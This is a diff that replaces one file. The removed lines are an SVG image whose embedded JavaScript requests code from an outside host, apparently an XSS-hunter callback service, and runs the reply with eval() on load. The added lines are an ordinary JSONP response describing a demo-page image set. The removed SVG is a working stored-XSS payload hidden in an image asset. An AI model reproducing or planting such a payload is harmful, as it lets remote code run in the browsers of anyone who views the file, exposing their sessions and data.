@@ -1,9 +1,1 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
-   <script type="text/javascript">
-      function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//panch0r3d.xss.ht");a.send();
-   </script>
-</svg>
+/*jsonp*/s7classics7sdkJSONResponse({"set":{"pv":"1.0","type":"img_set","n":"content/dam/dm-public-facing-live-demo-page/08_mug_inline_zoom/mug_inline_zoom","item":{"i":{"n":"content/dam/dm-public-facing-live-demo-page/08_mug_inline_zoom/inline-zoom_cropped.jpg"},"s":{"n":"content/dam/dm-public-facing-live-demo-page/08_mug_inline_zoom/inline-zoom_cropped.jpg"},"dx":"1196","dy":"703","iv":"IZEml0"}}},"66550647");
